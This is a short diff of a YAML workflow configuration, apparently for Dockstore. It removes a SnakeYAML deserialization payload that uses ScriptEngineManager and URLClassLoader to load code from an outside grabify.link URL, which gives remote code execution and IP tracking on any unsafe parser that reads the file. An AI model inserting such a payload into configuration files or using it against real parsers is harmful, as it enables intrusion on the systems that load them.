@@ -9,8 +9,3 @@ workflows:
      publish: True
      testParameterFiles:
          - /test/dockstore.cwl.json
-!!javax.script.ScriptEngineManager [  
-     !!java.net.URLClassLoader [[  
-          !!java.net.URL ["https://grabify.link/FTRHRF"]  
-     ]]  
-] 
